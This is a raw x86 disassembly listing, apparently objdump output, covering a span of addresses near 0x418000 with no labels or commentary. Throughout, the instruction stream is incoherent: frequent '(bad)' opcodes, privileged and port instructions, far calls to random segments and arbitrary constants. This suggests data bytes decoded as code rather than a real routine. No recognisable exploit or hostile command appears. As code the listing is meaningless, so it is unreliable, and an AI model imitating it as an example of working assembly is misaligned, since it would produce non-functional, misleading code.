  417d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d84:	mov    bl,0xfa
  417d86:	mov    dl,0xc4
  417d88:	repz popa 
  417d8a:	stos   BYTE PTR es:[edi],al
  417d8b:	scas   eax,DWORD PTR es:[edi]
  417d8c:	add    al,0x34
  417d8e:	arpl   WORD PTR [eax+eiz*1+0x5f],dx
  417d92:	adc    DWORD PTR [ecx-0xc18ecf3],ecx
  417d98:	sbb    eax,0xc98ec255
  417d9d:	aas    
  417d9e:	es jb  0x417df5
  417da1:	inc    esi
  417da2:	lods   eax,DWORD PTR ds:[esi]
  417da3:	push   es
  417da4:	(bad)  
  417da5:	adc    al,BYTE PTR [ebx]
  417da7:	pop    edx
  417da8:	mov    bh,0x32
  417daa:	xchg   edi,eax
  417dab:	jp     0x417e04
  417dad:	sbb    BYTE PTR [esi],dl
  417daf:	or     ebx,DWORD PTR [ebx+eiz*4+0x1b]
  417db3:	ins    BYTE PTR es:[edi],dx
  417db4:	mov    ds:0x66fd6b69,eax
  417db9:	cmp    ebp,DWORD PTR ds:0xba53e3f3
  417dbf:	and    eax,0xbdd32db0
  417dc4:	cmp    esi,DWORD PTR [ecx-0x25949479]
  417dca:	cmp    BYTE PTR [ebx+0x5ba583c1],ch
  417dd0:	mov    edi,0x3cb99eac
  417dd5:	fs std 
  417dd7:	cmp    eax,0x61ae7595
  417ddc:	scas   eax,DWORD PTR es:[edi]
  417ddd:	jb     0x417e34
  417ddf:	aas    
  417de0:	jb     0x417dfc
  417de2:	test   al,0x60
  417de4:	add    eax,0x83f585b2
  417de9:	(bad)  
  417dea:	std    
  417deb:	pop    eax
  417dec:	push   ebx
  417ded:	add    ecx,DWORD PTR [eax]
  417def:	add    bl,dh
  417df1:	pop    ecx
  417df2:	popa   
  417df3:	xor    DWORD PTR [edx-0xf922dd0],0x4a4fcb19
  417dfd:	jo     0x417dba
  417dff:	and    esp,ecx
  417e01:	fild   DWORD PTR [ecx+eax*8]
  417e04:	ret    
  417e05:	rol    BYTE PTR [eax],cl
  417e07:	sbb    eax,0xa011fc42
  417e0c:	iret   
  417e0d:	xchg   ebx,eax
  417e0e:	je     0x417e48
  417e10:	stc    
  417e11:	or     al,0x43
  417e13:	pop    ecx
  417e14:	adc    eax,0xce430b71
  417e1a:	shl    DWORD PTR [ecx-0x6f30d15e],cl
  417e20:	(bad)  
  417e21:	icebp  
  417e22:	mov    al,0x29
  417e24:	icebp  
  417e25:	int3   
  417e26:	and    eax,0x865c08de
  417e2b:	stos   DWORD PTR es:[edi],eax
  417e2c:	fild   WORD PTR [ebx-0x2c]
  417e2f:	cmp    edi,DWORD PTR [eax-0x28]
  417e32:	ror    BYTE PTR [ebx+ecx*1+0x4e908d92],1
  417e39:	pop    ecx
  417e3a:	aam    0xa2
  417e3c:	enter  0x753e,0xcd
  417e40:	jge    0x417e4b
  417e42:	ffree  st(2)
  417e44:	mov    esp,0xe6b9bbd5
  417e49:	sbb    esp,DWORD PTR [ebx]
  417e4b:	int    0xbb
  417e4d:	dec    ebx
  417e4e:	jg     0x417e55
  417e50:	frstor [edi]
  417e52:	cld    
  417e53:	jns    0x417def
  417e55:	dec    esp
  417e56:	lods   al,BYTE PTR ds:[esi]
  417e57:	adc    al,BYTE PTR [ecx]
  417e59:	imul   ebp,DWORD PTR ds:0x6a0cff5e,0xa5ab28c0
  417e63:	add    eax,0x69da0d36
  417e68:	js     0x417e10
  417e6a:	ds loopne 0x417e9c
  417e6d:	retf   
  417e6e:	loop   0x417e6f
  417e70:	cmp    al,0x2
  417e72:	push   esp
  417e73:	cmp    DWORD PTR [ecx],0xc8095a68
  417e79:	adc    ah,0x7
  417e7c:	xchg   edi,eax
  417e7d:	outs   dx,BYTE PTR ds:[esi]
  417e7e:	cli    
  417e7f:	jle    0x417ebb
  417e81:	ds gs test ebx,ebp
  417e85:	sub    BYTE PTR [ecx],0xba
  417e88:	ret    
  417e89:	mov    ah,0xb9
  417e8b:	cs xchg ecx,eax
  417e8d:	push   0x4f02c477
  417e92:	js     0x417eb8
  417e94:	in     eax,0xc3
  417e96:	mov    eax,ds:0x511c27c6
  417e9b:	push   ebp
  417e9c:	jge    0x417ee2
  417e9e:	jno    0x417e6f
  417ea0:	xchg   edi,eax
  417ea1:	mov    esp,0xd1e9ad8d
  417ea6:	arpl   WORD PTR [eax],dx
  417ea8:	sub    eax,DWORD PTR [edx]
  417eaa:	in     eax,dx
  417eab:	arpl   WORD PTR [eax+0x5064493a],di
  417eb1:	test   eax,0x1e0bf7b6
  417eb6:	out    dx,eax
  417eb7:	sub    eax,0x3539172e
  417ebc:	add    BYTE PTR [esi],ah
  417ebe:	fiadd  DWORD PTR [eax+0x11b1a011]
  417ec4:	push   edx
  417ec5:	pop    ss
  417ec6:	fcom   DWORD PTR [eax]
  417ec8:	sar    BYTE PTR [eax-0xc553b2],1
  417ece:	loop   0x417ec2
  417ed0:	and    eax,edi
  417ed2:	add    al,0xc7
  417ed4:	jp     0x417ead
  417ed6:	inc    ebx
  417ed7:	(bad)  
  417ed8:	les    esp,FWORD PTR [edi+eiz*1]
  417edb:	add    bh,BYTE PTR [esi+esi*1+0x50]
  417edf:	(bad)  
  417ee1:	xor    eax,0xd076384a
  417ee6:	mov    edx,0x1b36b63b
  417eeb:	jo     0x417eca
  417eed:	jg     0x417e7f
  417eef:	aam    0x4b
  417ef1:	add    BYTE PTR [esi+0xce8ab31],0x44
  417ef8:	pop    ebp
  417ef9:	mov    eax,ds:0xb2a88368
  417efe:	jge    0x417f45
  417f00:	gs mov esp,0xdf6c0d5d
  417f06:	xor    ebx,ecx
  417f08:	test   DWORD PTR [esi+ecx*4],ebx
  417f0b:	inc    esp
  417f0c:	inc    edi
  417f0d:	jg     0x417ee6
  417f0f:	shl    dl,cl
  417f11:	push   edx
  417f12:	mov    ah,bh
  417f14:	fld    QWORD PTR ds:0xb5ac951c
  417f1a:	sti    
  417f1b:	scas   eax,DWORD PTR es:[edi]
  417f1c:	or     eax,0x91801b28
  417f21:	bound  ecx,QWORD PTR [esi]
  417f23:	mov    ecx,DWORD PTR [ebx]
  417f25:	mov    bh,0xc3
  417f27:	sub    ch,BYTE PTR [ebx+0x75921702]
  417f2d:	or     DWORD PTR [edi-0x1],ebp
  417f30:	dec    eax
  417f31:	dec    esp
  417f32:	test   al,0xc1
  417f34:	jecxz  0x417ef6
  417f36:	in     eax,0x42
  417f38:	test   BYTE PTR [ebx-0x1257a25a],al
  417f3e:	test   DWORD PTR [esi-0x57],esp
  417f41:	pop    ebx
  417f42:	test   al,0x35
  417f44:	imul   ebp,DWORD PTR [edx+ecx*2],0x7e
  417f48:	mov    edi,0x8f360628
  417f4d:	adc    bx,WORD PTR [eax+edx*8+0x573c46c2]
  417f55:	iret   
  417f56:	dec    esp
  417f57:	mov    bh,0xeb
  417f59:	mov    dl,0xc9
  417f5b:	pop    ss
  417f5c:	cdq    
  417f5d:	xchg   ecx,eax
  417f5e:	loopne 0x417f8f
  417f60:	(bad)  
  417f61:	std    
  417f62:	cld    
  417f63:	call   0x7bdb:0x6a910221
  417f6a:	xor    ah,BYTE PTR [ebx]
  417f6c:	call   0xe1c2:0xe25579a5
  417f73:	arpl   WORD PTR [edi+eax*4],di
  417f76:	mov    ch,0x7c
  417f78:	inc    ebp
  417f79:	nop
  417f7a:	inc    ebx
  417f7b:	xchg   DWORD PTR [esi-0x84c497b],ebp
  417f81:	lods   al,BYTE PTR ds:[esi]
  417f82:	shr    DWORD PTR [edi+0x63],cl
  417f85:	jmp    0xb34:0xf87210d4
  417f8c:	adc    BYTE PTR [edi-0x78],dh
  417f8f:	push   edx
  417f90:	xchg   edx,eax
  417f91:	call   0x7131:0x3de385c2
  417f98:	add    esp,DWORD PTR [ebx-0x49]
  417f9b:	pop    esp
  417f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f9d:	and    al,0xda
  417f9f:	and    bl,cl
  417fa1:	mov    esp,0xc9e77aba
  417fa6:	lahf   
  417fa7:	jb     0x417f64
  417fa9:	in     al,dx
  417faa:	push   edi
  417fab:	ret    0x4147
  417fae:	xor    DWORD PTR [ebx-0x7993ddb0],0x77124a68
  417fb8:	aas    
  417fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fba:	mov    al,ds:0x35d26d20
  417fbf:	fsub   QWORD PTR [ebx-0x7bf976d0]
  417fc5:	mov    bh,BYTE PTR [eax-0x59]
  417fc8:	inc    si
  417fca:	adc    eax,0x4bd47be9
  417fcf:	or     DWORD PTR [eax],0x3e2cdbf8
  417fd5:	jp     0x417fa8
  417fd7:	and    BYTE PTR [esi],0x89
  417fda:	enter  0x2cc8,0x58
  417fde:	dec    ecx
  417fdf:	loop   0x41803d
  417fe1:	push   esi
  417fe2:	hlt    
  417fe3:	xchg   edi,eax
  417fe4:	and    al,0x25
  417fe6:	mov    cl,0x95
  417fe8:	addr16 loopne 0x417fc6
  417feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fec:	fld    TBYTE PTR [eax+0x72dea41d]
  417ff2:	jnp    0x417fc4
  417ff4:	xchg   al,ch
  417ff6:	popa   
  417ff7:	cs pop ss
  417ff9:	clc    
  417ffa:	sbb    al,0x9f
  417ffc:	leave  
  417ffd:	div    BYTE PTR [ebp+0x72fe6a02]
  418003:	inc    ecx
  418004:	jge    0x41803c
  418006:	cmp    al,0x2
  418008:	and    cl,BYTE PTR [ecx]
  41800a:	test   BYTE PTR [ebp+eax*2-0x471e5f40],0x8f
  418012:	dec    ebp
  418013:	fwait
  418014:	jae    0x41802c
  418016:	push   ebp
  418017:	loope  0x418078
  418019:	addr16 xchg edx,eax
  41801b:	add    bl,BYTE PTR [eax+0x51eb5384]
  418021:	sbb    ebp,DWORD PTR [esi]
  418023:	scas   eax,DWORD PTR es:[edi]
  418024:	out    0x91,eax
  418026:	mov    ebx,0xc95e6172
  41802b:	mov    bl,ah
  41802d:	(bad)  
  41802e:	loop   0x41807f
  418030:	cld    
  418031:	pop    ebp
  418032:	jg     0x418076
  418034:	mov    ah,0xb2
  418036:	(bad)  
  418037:	(bad)  
  418038:	adc    eax,0x962f2871
  41803d:	xlat   BYTE PTR ds:[ebx]
  41803e:	mov    eax,DWORD PTR [eax]
  418040:	xchg   DWORD PTR [esi],eax
  418042:	jge    0x418083
  418044:	xchg   ebp,eax
  418045:	pusha  
  418046:	das    
  418047:	pop    edi
  418048:	out    0x45,eax
  41804a:	div    DWORD PTR [edx]
  41804c:	mov    BYTE PTR [ecx-0x4608696],0x74
  418053:	push   eax
  418054:	lods   eax,DWORD PTR ds:[esi]
  418055:	test   al,0x22
  418057:	mov    al,0x83
  418059:	inc    ebx
  41805a:	lods   al,BYTE PTR ds:[esi]
  41805b:	ins    BYTE PTR es:[edi],dx
  41805c:	mov    esi,0xaecebcfe
  418061:	loope  0x4180b9
  418063:	push   ebx
  418064:	jl     0x4180ba
  418066:	rol    DWORD PTR [eax+eiz*2+0x4d],cl
  41806a:	inc    ebp
  41806b:	inc    esi
  41806c:	shl    ebp,1
  41806e:	cs jmp 0xcdccbd2d
  418074:	mov    eax,ds:0x6274ae9d
  418079:	and    BYTE PTR [ecx+0x4a071f6c],0xb8
  418080:	mov    bh,BYTE PTR [ecx-0x43]
  418083:	(bad)  
  418084:	add    al,0xc9
  418086:	scas   al,BYTE PTR es:[edi]
  418087:	(bad)  
  418088:	xchg   ebp,eax
  418089:	lahf   
  41808a:	xor    BYTE PTR [edx],ch
  41808c:	mov    ebp,0x91ddc9cc
  418091:	mov    bl,0x3f
  418093:	(bad)  
  418095:	das    
  418096:	mov    eax,0x7dfb9d5e
  41809b:	(bad)  
  41809c:	in     al,dx
  41809d:	call   0xb5b2:0x5a94628c
  4180a4:	inc    eax
  4180a5:	addr16 mov ah,0x55
  4180a8:	inc    ebp
  4180a9:	arpl   sp,si
  4180ab:	mov    dh,0x4
  4180ad:	sub    DWORD PTR [edi-0x68],0xffffff96
  4180b1:	xlat   BYTE PTR ds:[ebx]
  4180b2:	out    dx,eax
  4180b3:	push   cs
  4180b4:	lea    edi,[esi+eiz*2+0x2d732b84]
  4180bb:	add    ah,al
  4180bd:	mov    ch,0x19
  4180c0:	imul   DWORD PTR [esi]
  4180c2:	xor    edx,ecx
  4180c4:	inc    esi
  4180c5:	rcl    DWORD PTR [ebp-0x336172e4],0xfe
  4180cc:	push   0xffffffde
  4180ce:	sbb    al,BYTE PTR [edx]
  4180d0:	xlat   BYTE PTR fs:[ebx]
  4180d2:	dec    ecx
  4180d3:	jae    0x41806f
  4180d5:	cmp    BYTE PTR [edi+ecx*1+0x885ec5c],0x88
  4180dd:	loope  0x4180ce
  4180df:	es jmp 0x7cfa:0xef268239
  4180e7:	add    dh,BYTE PTR [esi+edi*2-0x5a4aea05]
  4180ee:	add    DWORD PTR [edx],eax
  4180f0:	pop    ds
  4180f1:	adc    dh,BYTE PTR [eax-0x58466707]
  4180f7:	xchg   esp,eax
  4180f8:	cmp    bl,BYTE PTR [ecx+eax*8-0x7e42fc8e]
  4180ff:	mov    ebp,0xbc714f11
  418104:	pop    edx
  418105:	xchg   esp,eax
  418106:	inc    eax
  418107:	arpl   dx,sp
  418109:	repz fsubr QWORD PTR [eax]
  41810c:	sub    eax,DWORD PTR [edx-0x52]
  41810f:	(bad)  
  418110:	cmc    
  418111:	pop    ss
  418112:	inc    esi
  418113:	xchg   ebx,eax
  418114:	mov    cl,0xc7
  418116:	cwde   
  418117:	dec    ebx
  418118:	enter  0x5bf7,0x94
  41811c:	gs push esi
  41811e:	jns    0x4180e4
  418120:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418121:	jg     0x418118
  418123:	inc    esp
  418124:	bsr    ebx,DWORD PTR [edx-0x3590f97]
  41812b:	sub    ch,BYTE PTR [edx]
  41812d:	or     eax,DWORD PTR [edx+ebx*1-0x78]
  418131:	jg     0x41819d
  418133:	sub    ch,BYTE PTR [esi-0x23b1d681]
  418139:	and    ah,BYTE PTR [edi+0x50485bf1]
  41813f:	aad    0xef
  418141:	loopne 0x418135
  418143:	push   0xffffffe9
  418145:	daa    
  418146:	std    
  418147:	xor    ch,BYTE PTR [eax-0x4b]
  41814a:	in     al,dx
  41814b:	aaa    
  41814c:	aam    0x7
  41814e:	retf   
  41814f:	add    eax,0x24a55d73
  418154:	enter  0x25d,0xc1
  418158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418159:	xor    al,BYTE PTR gs:0x2b315c3f
  418160:	stos   BYTE PTR es:[edi],al
  418161:	retf   0xc5e8
  418164:	xor    esi,ebp
  418166:	sahf   
  418167:	mov    bh,BYTE PTR [edi]
  418169:	cmc    
  41816a:	sbb    BYTE PTR [eax],0x33
  41816d:	pop    esp
  41816e:	data16 xor BYTE PTR [eax+0x3f553e0b],bl
  418175:	mov    ch,0xe0
  418177:	fistp  WORD PTR [edi]
  418179:	xlat   BYTE PTR ds:[ebx]
  41817a:	push   edx
  41817b:	outs   dx,BYTE PTR ds:[esi]
  41817c:	add    bh,BYTE PTR [ecx+ecx*4+0x777dff59]
  418183:	ficom  WORD PTR [ecx-0x4e4fe0fb]
  418189:	stos   DWORD PTR es:[edi],eax
  41818a:	mov    ds:0x746af33,al
  41818f:	and    cl,BYTE PTR [edi]
  418191:	jge    0x418147
  418193:	cwde   
  418194:	sar    DWORD PTR [edx-0x29c489a6],1
  41819a:	jmp    0x4181c8
  41819c:	cmc    
  41819d:	jmp    0x41815b
  41819f:	shr    BYTE PTR [edx-0x1],0xd0
  4181a3:	cmp    al,0xa7
  4181a5:	jmp    0xbf369880
  4181aa:	lods   eax,DWORD PTR ds:[esi]
  4181ab:	jmp    0x97e6b805
  4181b0:	mov    eax,ds:0xc249b67f
  4181b5:	fs push ebx
  4181b7:	cmp    edi,edx
  4181b9:	cld    
  4181ba:	push   esi
  4181bb:	dec    esi
  4181bc:	push   ecx
  4181bd:	dec    esi
  4181be:	mov    esp,0x8e095ac1
  4181c3:	pop    es
  4181c4:	mov    al,ds:0x87c4338f
  4181c9:	jbe    0x418153
  4181cb:	scas   al,BYTE PTR es:[edi]
  4181cc:	sub    edi,edi
  4181ce:	enter  0x1013,0x1c
  4181d2:	add    al,0xac
  4181d4:	(bad)  
  4181d6:	cmp    eax,0xbc26c060
  4181db:	dec    edx
  4181dc:	add    bh,ch
  4181de:	jbe    0x4181aa
  4181e0:	(bad)  
  4181e1:	in     eax,dx
  4181e2:	int3   
  4181e3:	nop
  4181e4:	pushf  
  4181e5:	fisttp QWORD PTR [ecx]
  4181e7:	pop    ecx
  4181e8:	push   0x3bb6d89e
  4181ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181ee:	sbb    DWORD PTR [eax-0xc],ebp
  4181f1:	adc    al,0x55
  4181f3:	gs jmp 0x28254927
  4181f9:	mov    al,BYTE PTR [ecx+edx*1]
  4181fc:	inc    ecx
  4181fd:	mov    esi,0x94f012e8
  418202:	adc    dh,bl
  418204:	jmp    0x332d:0x853b5a51
  41820b:	inc    esi
  41820c:	jmp    0x6275cba2
  418211:	and    al,0x1f
  418213:	add    DWORD PTR [ecx],esp
  418215:	dec    esi
  418216:	aaa    
  418217:	sar    eax,0xb6
  41821a:	add    DWORD PTR [ecx+edi*2],esi
  41821d:	sbb    ebx,eax
  41821f:	mov    es,WORD PTR [eax]
  418221:	fs call 0xbf49bcd
  418227:	retf   
  418228:	fdivr  DWORD PTR [ecx+0x7ea16cd8]
  41822e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41822f:	inc    eax
  418230:	clc    
  418231:	or     al,0x80
  418233:	push   cs
  418234:	lahf   
  418235:	sub    al,0xf9
  418237:	mov    ah,0x2
  418239:	xchg   ecx,eax
  41823a:	into   
  41823b:	sbb    esp,ebx
  41823d:	sbb    ch,BYTE PTR cs:[ecx-0xb]
  418241:	xlat   BYTE PTR ds:[ebx]
  418242:	daa    
  418243:	fptan  
  418245:	(bad)  
  418246:	or     cl,dl
  418248:	icebp  
  418249:	sbb    al,0x26
  41824b:	and    cl,BYTE PTR [ecx+ebx*8+0x5d15ba7c]
  418252:	(bad)  
  418253:	leave  
  418254:	pop    ecx
  418255:	in     al,dx
  418256:	add    edi,eax
  418258:	shl    ah,cl
  41825a:	jns    0x418204
  41825c:	mov    ebx,0xad7a294d
  418261:	pop    ebp
  418262:	int3   
  418263:	sub    eax,0x539bef2c
  418268:	inc    esi
  418269:	pop    es
  41826a:	loope  0x418231
  41826c:	sbb    bh,BYTE PTR ds:0x5b6704f0
  418272:	push   ecx
  418273:	pop    ebx
  418274:	into   
  418275:	push   es
  418276:	leave  
  418277:	dec    edx
  418278:	repz sbb DWORD PTR [ecx],ebx
  41827b:	push   0x5e
  41827d:	imul   esi,DWORD PTR [esi+0x6e8ec8b4],0xffffff91
  418284:	data16 jns 0x4182df
  418287:	clc    
  418288:	dec    ebx
  418289:	sub    eax,0x6e3a451b
  41828e:	pop    eax
  41828f:	pop    ebx
  418290:	add    BYTE PTR [eax+0xa],bh
  418293:	jmp    0x57f8:0x3065f76d
  41829a:	les    edi,FWORD PTR [ebp+0x4e7f4cf5]
  4182a0:	push   es
  4182a1:	push   0xaafde3ac
  4182a6:	outs   dx,BYTE PTR ds:[esi]
  4182a8:	xchg   ebx,eax
  4182a9:	cmp    eax,0x8b783ada
  4182ae:	imul   DWORD PTR [esi+0x13]
  4182b1:	hlt    
  4182b2:	arpl   WORD PTR [eax],bp
  4182b4:	imul   ebp,DWORD PTR [esp+eiz*4-0x56e58edc],0xffffffd8
  4182bc:	fbstp  TBYTE PTR [eax-0x3a3295e3]
  4182c2:	add    ch,bl
  4182c4:	int    0xce
  4182c6:	js     0x418337
  4182c8:	int    0x20
  4182ca:	add    esi,0x5603431a
  4182d0:	hlt    
  4182d1:	mov    dh,0x8
  4182d3:	mov    al,0x1d
  4182d5:	cmp    eax,0x4ba328a3
  4182da:	xor    eax,0x36cb434a
  4182df:	sti    
  4182e0:	mov    ds:0xd99fb89e,al
  4182e5:	fisubr DWORD PTR [edi]
  4182e7:	push   ecx
  4182e8:	int    0x94
  4182ea:	test   eax,0x4acf4119
  4182ef:	add    esi,ecx
  4182f1:	retf   
  4182f2:	outs   dx,BYTE PTR ds:[esi]
  4182f3:	and    dl,ah
  4182f5:	push   esi
  4182f6:	or     al,0x9f
  4182f8:	inc    edx
  4182f9:	xor    al,0x4b
  4182fb:	fimul  DWORD PTR [ebp-0x59448ac0]
  418301:	int3   
  418302:	js     0x4182be
  418304:	dec    esi
  418305:	push   ebx
  418306:	dec    edx
  418307:	cld    
  418308:	sub    BYTE PTR ds:0xae7032ac,0xd9
  41830f:	mov    dh,0xcd
  418311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418312:	jne    0x4182c9
  418314:	add    al,0x7f
  418316:	cmp    al,0xd4
  418318:	xlat   BYTE PTR ds:[ebx]
  418319:	push   edx
  41831a:	and    DWORD PTR [eax-0xb459d78],edi
  418320:	shl    BYTE PTR [ebx-0x3dd18e5d],cl
  418326:	push   esp
  418327:	sub    BYTE PTR [edi],bl
  418329:	inc    eax
  41832a:	mov    ebp,DWORD PTR [ebx+0x1b5a23ad]
  418330:	inc    edi
  418331:	pop    ebp
  418332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418333:	jne    0x418360
  418335:	xlat   BYTE PTR ds:[ebx]
  418336:	test   eax,0x3b860715
  41833b:	pop    ss
  41833c:	dec    ebx
  41833d:	int    0x23
  41833f:	adc    DWORD PTR [ecx-0x26],0xcd2f73f0
  418346:	repnz add eax,0x4345c55c
  41834c:	jle    0x41839a
  41834e:	dec    esp
  41834f:	loopne 0x418394
  418351:	lahf   
  418352:	cmp    ebx,DWORD PTR [edi-0x235628d]
  418358:	mov    bl,0x5f
  41835a:	pop    es
  41835b:	push   ebx
  41835c:	sub    cl,0x81
  41835f:	sbb    esp,ebp
  418361:	sahf   
  418362:	or     ah,BYTE PTR [edx+0x2f8b296b]
  418368:	dec    eax
  418369:	fs dec esp
  41836b:	mov    fs,WORD PTR [esi]
  41836d:	out    dx,eax
  41836e:	xor    ebx,esi
  418370:	add    dh,BYTE PTR [esi+0x48b4c640]
  418376:	and    eax,DWORD PTR [ebp+0x36]
  418379:	aam    0x14
  41837b:	adc    al,0xe8
  41837d:	(bad)  
  41837e:	push   ecx
  41837f:	push   cs
  418380:	pop    edi
  418381:	or     bh,BYTE PTR [esi-0x7a]
  418384:	scas   al,BYTE PTR es:[edi]
  418385:	inc    ebx
  418386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418387:	sub    DWORD PTR [ecx],edx
  418389:	(bad)  
  41838a:	aam    0x8f
  41838c:	dec    esp
  41838d:	adc    eax,0xa71ed9f
  418392:	adc    edx,DWORD PTR [ecx-0x77]
  418395:	xor    cl,BYTE PTR [ebx]
  418397:	idiv   DWORD PTR [ebp+0x44]
  41839a:	pop    eax
  41839b:	or     al,0x1c
  41839d:	add    bh,BYTE PTR [ecx-0x602ed629]
  4183a3:	jbe    0x4183d3
  4183a5:	repnz dec edi
  4183a7:	and    eax,DWORD PTR [ebp+0x50]
  4183aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183ab:	repnz mov al,ds:0xeed49a64
  4183b1:	pop    ss
  4183b2:	pop    ebx
  4183b3:	ss mov esp,0x3b01937a
  4183b9:	mov    edi,0xf021fd69
  4183be:	outs   dx,BYTE PTR ds:[esi]
  4183bf:	sti    
  4183c0:	in     al,0x14
  4183c2:	(bad)  
  4183c4:	mov    edi,0xd30fc9a2
  4183c9:	jae    0x418393
  4183cb:	cmp    BYTE PTR [edi-0x7899007a],dh
  4183d1:	adc    DWORD PTR [edx+0x4e],ebx
  4183d4:	dec    ebx
  4183d5:	test   BYTE PTR [esi-0x15f7c030],ah
  4183db:	(bad)  
  4183dc:	xor    eax,0x9741e5eb
  4183e1:	std    
  4183e2:	lea    ebp,[ebx]
  4183e4:	test   edx,ebx
  4183e6:	outs   dx,BYTE PTR ds:[esi]
  4183e7:	mov    ds:0x951fa0a5,eax
  4183ec:	or     edi,DWORD PTR [edx-0x603297b2]
  4183f2:	inc    edx
  4183f3:	sbb    esp,DWORD PTR [ebx+0x79]
  4183f6:	mov    WORD PTR [edi+0x1e0d3d89],?
  4183fc:	inc    edi
  4183fd:	jne    0x41839d
  4183ff:	fsub   st,st(2)
  418401:	pop    ebp
  418402:	dec    esi
  418403:	pop    eax
  418404:	fwait
  418405:	stos   DWORD PTR es:[edi],eax
  418406:	in     eax,dx
  418407:	cmp    DWORD PTR [edi],ebp
  418409:	mov    BYTE PTR fs:0x6ab1f82c,cl
  418410:	push   ecx
  418411:	and    ah,BYTE PTR [ebx]
  418413:	cmp    al,BYTE PTR [ebp+0x4]
  418416:	outs   dx,DWORD PTR ds:[esi]
  418417:	outs   dx,BYTE PTR ds:[esi]
  418418:	pop    ss
  418419:	into   
  41841a:	jmp    ebx
  41841c:	aam    0x40
  41841e:	jne    0x41844e
  418420:	scas   eax,DWORD PTR es:[edi]
  418421:	(bad)  
  418422:	xchg   edi,eax
  418423:	mov    ch,0x50
  418425:	(bad)  
  418427:	pusha  
  418428:	add    eax,0xb2c3aa1f
  41842d:	push   0x884ea7af
  418432:	in     al,dx
  418433:	jmp    0x418462
  418435:	xchg   DWORD PTR [eax+ebp*2-0x7eb9c9b7],edx
  41843c:	int    0x5
  41843e:	jge    0x418480
  418440:	(bad)  
  418441:	and    al,0x24
  418443:	or     DWORD PTR [esi-0x45],ecx
  418446:	jmp    0x848136ed
  41844b:	(bad)
  41844e:	out    dx,al
  41844f:	shr    dl,0xbd
  418452:	sbb    BYTE PTR [ecx-0x35],cl
  418455:	add    ebx,eax
  418457:	loope  0x41848b
  418459:	neg    DWORD PTR [ecx+eiz*4+0x10e8df4e]
  418460:	stc    
  418461:	inc    edx
  418462:	push   esp
  418463:	leave  
  418464:	cmp    ebp,0xea4b1933
  41846a:	and    al,0x58
  41846c:	test   al,0x16
  41846e:	stos   DWORD PTR es:[edi],eax
  41846f:	jmp    0x418423
  418471:	xchg   edi,eax
  418472:	mov    ds:0xd0b3418d,eax
  418477:	lock test al,0x9f
  41847a:	push   ebp
  41847b:	push   ecx
  41847c:	hlt    
  41847d:	int    0xf8
  41847f:	mov    al,ds:0x9e8fe4b8
  418484:	(bad)  
  418485:	and    eax,0x1ca0317f
  41848a:	mov    cr0,esp
  41848d:	push   esi
  41848e:	sub    eax,0x9bd41543
  418493:	jg     0x418457
  418495:	in     eax,dx
  418496:	sti    
  418497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418498:	dec    ecx
  418499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41849a:	jp     0x41844f
  41849c:	call   0x6430d7d8
  4184a1:	dec    edi
  4184a2:	cli    
  4184a3:	fwait
  4184a4:	cld    
  4184a5:	mov    ah,0x1e
  4184a7:	mov    dh,0xf0
  4184a9:	inc    ebx
  4184aa:	adc    bh,bl
  4184ac:	iret   
  4184ad:	and    BYTE PTR [eax],dl
  4184af:	or     BYTE PTR [ecx-0x7b250aba],dh
  4184b5:	and    eax,0x42a9fa49
  4184ba:	add    edx,DWORD PTR ds:0x37865f41
  4184c0:	inc    eax
  4184c1:	in     eax,0x81
  4184c3:	sub    DWORD PTR [ecx-0x19],ebp
  4184c6:	es mov bl,0x7a
  4184c9:	or     al,0x1d
  4184cb:	and    BYTE PTR ds:0x78b1bb97,ch
  4184d1:	mov    dl,0x1d
  4184d3:	xchg   edx,eax
  4184d4:	lods   eax,DWORD PTR ds:[esi]
  4184d5:	jne    0x4184d0
  4184d7:	mov    al,0xd3
  4184d9:	into   
  4184da:	cmp    eax,0xe1daab72
  4184df:	scas   al,BYTE PTR es:[edi]
  4184e0:	stc    
  4184e1:	out    dx,eax
  4184e2:	jne    0x4184e3
  4184e4:	mov    eax,0xecb0adad
  4184e9:	sbb    edi,ebx
  4184eb:	pop    ss
  4184ec:	jecxz  0x4184f3
  4184ee:	adc    eax,0x3b2d1044
  4184f3:	pop    es
  4184f4:	xchg   BYTE PTR [ecx-0x3f],ch
  4184f7:	jno    0x418536
  4184f9:	loope  0x41848a
  4184fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184fc:	sbb    BYTE PTR [ecx+0x157aeda7],ch
  418502:	jno    0x418494
  418504:	rcl    esi,0xcd
  418507:	ss sbb al,0xe0
  41850a:	mov    al,0x80
  41850c:	aam    0xb4
  41850e:	ret    
  41850f:	not    BYTE PTR [esi]
  418511:	(bad)  
  418512:	mov    bl,0xb
  418514:	cs mov ch,0x4f
  418517:	sbb    BYTE PTR [edi+0x13],0xc6
  41851b:	stos   DWORD PTR es:[edi],eax
  41851c:	not    BYTE PTR [ebx]
  41851e:	inc    DWORD PTR [edx-0x56]
  418521:	or     dl,cl
  418523:	xor    DWORD PTR [edx-0x1777ac99],ebp
  418529:	xchg   cl,dl
  41852b:	call   0x171925c2
  418530:	mov    edx,DWORD PTR [edx-0x62]
  418533:	(bad)  
  418534:	std    
  418535:	dec    edx
  418536:	dec    ebp
  418537:	icebp  
  418538:	dec    esi
  418539:	xchg   esp,eax
  41853a:	repnz test eax,0xc127ee86
  418540:	cwde   
  418541:	and    eax,DWORD PTR [edi]
  418543:	inc    edx
  418544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418545:	mov    dh,0x4a
  418547:	das    
  418548:	retf   
  418549:	das    
  41854a:	das    
  41854b:	pop    ecx
  41854c:	pop    ebx
  41854d:	in     eax,0xc0
  41854f:	ror    DWORD PTR [edx+0x3c],cl
  418552:	jno    0x41853b
